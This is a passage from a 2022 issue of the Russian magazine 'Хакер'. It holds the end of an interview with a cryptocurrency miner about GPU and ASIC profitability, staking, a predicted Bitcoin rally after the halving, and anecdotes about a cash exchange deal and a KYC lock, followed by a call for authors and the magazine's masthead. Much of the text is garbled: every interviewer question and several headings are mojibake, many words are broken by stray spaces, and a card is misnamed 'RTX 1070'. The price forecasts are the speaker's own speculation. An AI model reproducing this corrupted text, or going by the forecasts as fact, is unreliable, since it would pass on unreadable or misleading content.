Ведь крипта — это исключитель но про день ги, а не про технологии, как бы
печаль но это ни зву чало.


— Òî åñòü òû íå âåðèøü âî âñå ýòè DeFi-ðåâîëþöèè, Web3 è
ïðî÷èå ìåòàâåðñû? Íà òîé æå «Ñîëàíå» îãðîìíàÿ ýêîñèñòåìà,
âñÿêèå raydium.io è ïðî÷åå...
— Конечно, я верю во все эти приколюхи, но с приходом в крипту институци-
оналов все поменялось. Просто я выбираю PoW, так как это стабиль ность: уж
если все скаманет ся, то у меня хотя бы железяки останут ся. А если произойдет
какой-нибудь слешинг на стейкин ге, то это будет полный попадос, ты можешь
лишить ся как основного стейка, так и заработан ных монет. С повом это сде-
лать сложнее и дороже.




                      «Слешинг на стей кинге» — штра фы, при меня емые
                          к валида торам за нарушения процес са валида -
                        ции.





— Ïîñëå ïåðåõîäà íà PoS áóäåøü çàâîäèòü íîäó ýôèðà?
— Под эфир я ноду заводить точно не буду, есть более интересные и не такие
ресурсозат ратные проекты по стейкин гу. У меня есть ноды дру гих монет,
боль шинство из них — это VDS, но есть и железные ноды, так как арен довать
сервак с хорошей GPU очень дорого.


— À êàêèå ïðîåêòû èíòåðåñíåå, ÷åì ýôèð, â ïëàíå ñòåéêèíãà?
— Очень сложный вопрос, но я делаю ставку на Polkadot и ATOM, опять же
исключитель но ради прибыли. Проектов много, откры вай p2p.org и выбирай
любой. А вообще можно открыть Ledger Live и смот реть, какие монеты он под -
держивает в стейк. Я делаю так.


— Íàñêîëüêî âîîáùå ìàéíèíã ïðèáûëåí?
— Тут надо разделять майнинг на GPU и майнинг на асиках. И все зависит
от розет ки (стоимость киловатт-часа). От того, насколь ко у тебя дешевое элек -
тричество, напрямую зависит доход. Например, я в момен те плачу за свет
в четыре раза мень ше, чем ковыряется. С соседями проблем нет: я живу
в деревне в отдель ном доме, у меня сель ский тариф, и рядом нет никого, мне
вообще норм.
  По асикам на сейчас ситу ация у меня такая, что я работаю в ноль.
При цене 4,26 р. за киловатт-час.





                                ASIC

По GPU совсем наоборот, 90 бак сов в день чистыми. При цене 3,17 р.
за киловатт-час получается как на скрин шоте.





— À íà âèäåîêàðòàõ 90 áàêñîâ ÷èñòûìè — ýòî ôåðìà èç ñêîëüêèõ è
êàêèõ èìåííî âèäåîêàðò? È ñêîëüêî îíà ñòîèëà èçíà÷àëüíî?
— Около 80 карточек, Nvidia, все — 30-я серия. По цене вроде 2500 рублей
за мегахеш выш ло, но я точно не могу сказать, запамятовал что-то.




                  Мегахеш — еди ница измерения вычис лительной
                  мощ ности   устрой ства,  добыва ющего   крип-
                      товалюту: один мил лион переби раемых хешей
                        в секунду.



— Êàê áûñòðî óñòàðåâàåò îáîðóäîâàíèå?
— Тут все зависит от того, в каких условиях работают железяки. Если их обслу -
живать и не перег ревать, то они будут работать годами. У меня до сих пор тру -
дят ся и GeForce GTX 1070, им уже шесть лет. Тут скорее речь про расходники:
райзеры, блоки питания, кабелечки там разные. А осталь ное железо может
слу жить годами.


— Áûëè ïîæàðû? Êàêèå-òî àâàðèè? Âíåøòàòíûå ñèòóàöèè?
— Пожаров как таковых не было, бывало, выгорали вилки и розет ки, бабахали
кон деры в картах, но ничего серь езного не было. Потопы слу чались, пару раз
заливало риги, но ничего, феном просушил, и в работу опять!


— Ðåêà ðàçëèëàñü?
— Не настоль ко глобаль ный потоп! Просто балкон залило дождиком ;)





— À âîîáùå êîãäà è êàê òû óâëåêñÿ ìàéíèíãîì? Çàðàáàòûâàòü ñòàë
ñðàçó? Äîëãî ðàçáèðàëñÿ? Ñ êàêèìè ïðîáëåìàìè ñòàëêèâàëñÿ?
— Весной 2017 года я купил первый риг на шесть GeForce RTX 1070, и, ког да
увидел на пуле, как увеличивают ся копейки и оно само работает, я понял, что
эта работ ка по мне!
  Зарабатывать стал не сразу, на тот момент это был единствен ный источник
дохода. И так как я был в режиме HODL, я взял кредит в бан ке и оплачивал им
элек тричество, толь ко чтобы не тратить монет ки.
   Разбирался недолго, по сути риг — это обычный комп с боль шим количес-
твом видях. Все очень быстро и просто собирается. Плюс у меня есть кен ты,
которые майнили в 2009 году, и первую машин ку я собрал с ними.
  Проблемы...
   Единствен ная проблема — это жизнь в вечном ожидании пам па! Нормаль -
ные день ги пош ли где-то пару лет назад.


— Òî åñòü òû ìàéíèøü áèòêîèí è äðóãóþ êðèïòó âñå âðåìÿ, à
ïðîäàåøü òîëüêî íà ïàìïå?
— Я не продаю монеты, которые майню, пока есть свобод ные день ги.





— À êîãäà íà÷íåòñÿ íîâûé ïàìï áèòêîèíà? Â ðàéîíå õàëâèíãà
ïëþñ-ìèíóñ?
— Да, халва — это всег да пред вестник пам па. Исторически сложилось, что
после халвы биток пробивает новый абсолют ный мак симум. Ну и халвинг —
это же не толь ко про бит коин, скоро халва у ETC и Zcash. Я думаю, мы увидим
очеред ную ракету где-то в сен тябре 2024 года. Не финан совый совет!




                      Хал винг,  «уполови нива ние» —  пери оди чес кое
                      уменьшение  количес тва  генери руемого  Bitcoin
                       ровно наполовину.



— ×àñòî â ìåäèà è ÷àòàõ ðàçãîíÿåòñÿ èñòîðèÿ, ÷òî âîò ó ìàéíèíãà
åñòü êàêàÿ-òî òî÷êà, ãäå îí ñòàíîâèòñÿ óáûòî÷åí, è ìàéíåðû òîãäà
óéäóò èç áèòêîèíà. Ýòî ãîðîäñêàÿ ëåãåíäà èëè ÷òî-òî ðåàëüíîå?
— Конечно, я повторюсь, что все зависит от тарифа на элек тричество и от
модели асика. Мои M20s на 70 TH сейчас работают в ноль, если биток чуть
просядет, будет уже минус, и тут все зависит от твоей веры в биток — готов ли
ты платить за свет из своего кармана, а не из дохода асиков.




                       Whatsminer M20s 70 Th/s — ASIC для май нинга
                       бит коина.



— Òî åñòü âîçìîæíà ñèòóàöèÿ, ÷òî áîëüøàÿ ÷àñòü ìàéíåðîâ
ïëþíåò è íå ñòàíåò ìàéíèòü â óáûòîê, à ñåòü áèòêîèíà ñòàíåò
óÿçâèìà äëÿ àòàê?
— Нет, такой ситу ации не может быть, биток всег да будут майнить. А что
говорить про децен трализацию как век тор атаки, ну сейчас всеми мощами BTC
владеют чет веро-пятеро дядек. А вот на ETC, я думаю, мы увидим сюрпризы,
ког да на нее кинут эфирные мощности.


— Êàêîãî ïëàíà ñþðïðèçû?
— Ну что-то из серии атаки 51%, откат чейна. У ETC с этим всег да проблемы
были, тяжко им будет вывозить моща с эфира.


— ×òî áû òû ïîñîâåòîâàë íîâè÷êó, êîòîðûé ñåé÷àñ õî÷åò çàíÿòüñÿ
ìàéíèíãîì?
— Посоветовал бы терпения и никог да не брать кредит. Сейчас очень сочное
время для входа в майнинг: железа много и оно дешево. Если есть воз-
можность купить хотя бы пару карт и время, чтоб всем этим занимать ся, то я
советую не откладывать. В долгосрочной перспек тиве всег да выиг рывают
покупатели лопат, а не их продавцы.





— Äàâàé â çàêëþ÷åíèå êàêóþ-íèáóäü çàõâàòûâàþùóþ áàéêó èç
æèçíè ìàéíåðà.
— Наверное, самое интересное — это был эксперимент: как прожить месяц
за крипту, не выводя в фиат. Было драйвово и угарно объяснять людям, что
биток — это тоже день ги, толь ко лучше.
  Еще приколь ная ситу ация была, ког да мой хороший знакомый попросил
махнуть его бит ки на бак сы. Сум ма была немалень кая.
  Зима, холод, Москва. Прилетаем с ним в Москву на сделку, людей,
с которы ми я должен был встретить ся, я вообще не знаю. Постоян но менялись
места встречи, мы бегали по суг робам в поисках нужных нам людей, в итоге
где-то на краю мира нам приходит сообщение с локаш кой и маркой машины,
в которой будет встреча. Запрыгиваем на зад нее сиденье какого-то лютого
суперкара, и туда же вываливают два боль ших пакета с бак сами. Я было
подумал, что это наша конечная, но нет, все хорошо в итоге выш ло. Упаковали
всё по пакетам и двинули в аэропорт.
  Еще приколь чик был со встроенным в Ledger обменником. Нужно было
махнуть 6 BTC в DAI, в итоге у меня лочат все бит ки и просят пройти KYC и пре-
доставить инфу по двум тран закциям в сети эфира, которые были 619 дней
назад. Мне фартануло, что это были мои тран зы, и я попросил сделать дамп
депозитов и историю торгов. Через пять дней мои биточки разлочили. Правда,
теперь я этим сервисом не поль зуюсь...
   Ну а так приколов много разных бывало, и я думаю, что после PoS эфирки
нас ждут чудесные времена. Жду новые монеты и алги, а то надоело уже, что
оно само работает!
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №09 (282)

           Андрей Пись менный     Ва лентин Холмогоров        Илья Русанен
               Главный редактор          Ведущий редак тор              Разработка
                pismenny@glc.ru           valentin@holmogorov.ru           rusanen@glc.ru
                                   Евгения Шарипова
                                      Литера тур ный редактор


                           MEGANEWS

                             Мария Нефёдова
                                             nefedova@glc.ru


                                    АРТ

                                        yambuto
                                        yambuto@gmail.com


                     КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                    Олег Афонин, Иван Андреев,
                                 Марк Бруцкий-Стемпковский,
                                           Nik Zerof, Евгений Зобнин,
                                    Юрий Язев


                              РЕКЛАМА

                                    Анна Яков лева
                                    Директор по спецпроектам
                                              yakovleva.a@glc.ru


                     РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                        Воп росы по подписке:      Воп росы по материалам:
                                  lapina@glc.ru                support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, стро ение 1, этаж 8, помещение IX, комната 54, офис 7. Изда тель: ИП Югай
Александр Оле гович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080, город Мос -
ква, Волоколам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегистри рова но в Федеральной службе по надзору
в сфере свя зи, информа ционных тех нологий и массовых коммуника ций (Роскомнад зоре), свидетельство Эл № ФС77-67001 от 30.08.2016 года.
Мнение редак ции не обя зательно совпадает с мнением авторов. Все материалы в номере предоставляются как информа ция к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответствен ности. Редакция не несет ответственности
за содержание рекламных объявле ний в номере. По вопросам лицензирования и получения прав на использование редакционных материалов жур -
нала обращайтесь по адре су: xakep@glc.ru. © Журнал «Хакер», РФ, 2022